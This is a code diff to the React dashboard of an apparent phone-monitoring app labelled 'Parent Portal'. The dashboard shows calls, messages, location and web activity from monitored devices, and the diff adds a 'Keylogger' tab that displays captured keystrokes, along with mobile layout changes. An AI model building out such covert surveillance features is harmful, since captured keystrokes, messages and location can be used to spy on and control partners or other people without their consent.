@@ -11,6 +11,7 @@ import LocationMap from '../components/LocationMap';
 import WebActivityList from '../components/WebActivityList';
 import NotificationList from '../components/NotificationList';
 import InstalledAppList from '../components/InstalledAppList';
+import KeylogList from '../components/KeylogList';
 import { 
   PhoneCall, 
   MessageSquare, 
@@ -29,6 +30,7 @@ import {
 function DashboardPage() {
   const { token, logout } = useAuthContext();
   const [activeTab, setActiveTab] = useState('devices');
+  const [isMobileOpen, setIsMobileOpen] = useState(false);
   const [isLoading, setIsLoading] = useState(true);
   const [devices, setDevices] = useState([]);
   const [selectedDeviceId, setSelectedDeviceId] = useState(null);
@@ -39,7 +41,8 @@ function DashboardPage() {
     webActivity: [],
     locations: [],
     installedApps: [],
-    notifications: []
+    notifications: [],
+    keylogs: []
   });
   const [refreshTrigger, setRefreshTrigger] = useState(0);
 
@@ -58,7 +61,7 @@ function DashboardPage() {
             }
           };
 
-          const [devices, calls, sms, apps, web, locs, installed, notifs] = await Promise.all([
+          const [devices, calls, sms, apps, web, locs, installed, notifs, keylogs] = await Promise.all([
             fetchSafe(dataService.getDevices(token)),
             fetchSafe(dataService.getCallLogs(token)),
             fetchSafe(dataService.getSmsMessages(token)),
@@ -66,7 +69,8 @@ function DashboardPage() {
             fetchSafe(dataService.getWebActivity(token)),
             fetchSafe(dataService.getLocations(token)),
             fetchSafe(dataService.getInstalledApps(token)),
-            fetchSafe(dataService.getNotifications(token))
+            fetchSafe(dataService.getNotifications(token)),
+            fetchSafe(dataService.getKeylogs(token))
           ]);
           
           setDevices(devices);
@@ -81,7 +85,8 @@ function DashboardPage() {
             webActivity: web,
             locations: locs,
             installedApps: installed,
-            notifications: notifs
+            notifications: notifs,
+            keylogs: keylogs
           });
         } catch (error) {
           console.error('Error in fetchData:', error);
@@ -123,6 +128,7 @@ function DashboardPage() {
     locations: data.locations.filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
     installedApps: data.installedApps.filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
     notifications: data.notifications.filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
+    keylogs: (data.keylogs || []).filter(item => !selectedDeviceId || item.device_id === selectedDeviceId),
   };
 
   const renderContent = () => {
@@ -236,6 +242,9 @@ function DashboardPage() {
       case 'web':
         return <WebActivityList activity={filteredData.webActivity} />;
 
+      case 'keylogs':
+        return <KeylogList keylogs={filteredData.keylogs} />;
+
       case 'screen':
         return (
           <div className="bg-white rounded-3xl p-12 text-center border border-slate-200 border-dashed">
@@ -255,6 +264,7 @@ function DashboardPage() {
     { id: 'calls', label: 'Call History' },
     { id: 'sms', label: 'Messages' },
     { id: 'notifications', label: 'Notifications' },
+    { id: 'keylogs', label: 'Keylogger' },
     { id: 'location', label: 'Live Location' },
     { id: 'apps', label: 'App Inventory' },
     { id: 'web', label: 'Web Activity' },
@@ -262,14 +272,15 @@ function DashboardPage() {
 
   return (
     <div className="flex h-screen bg-[#F8FAFC] font-sans overflow-hidden">
-      <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} logout={logout} />
+      <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} logout={logout} isMobileOpen={isMobileOpen} setIsMobileOpen={setIsMobileOpen} />
 
-      <main className="flex-1 ml-64 flex flex-col h-full overflow-hidden relative">
+      <main className="flex-1 md:ml-64 flex flex-col h-full overflow-hidden relative w-full">
         <Header 
-          title={navItem?.label} 
+          title={navItem?.label || 'Parent Portal'} 
           devices={devices} 
           selectedDeviceId={selectedDeviceId} 
           setSelectedDeviceId={setSelectedDeviceId} 
+          onMenuClick={() => setIsMobileOpen(true)}
         />
 
         <div className="flex-1 overflow-y-auto p-10">
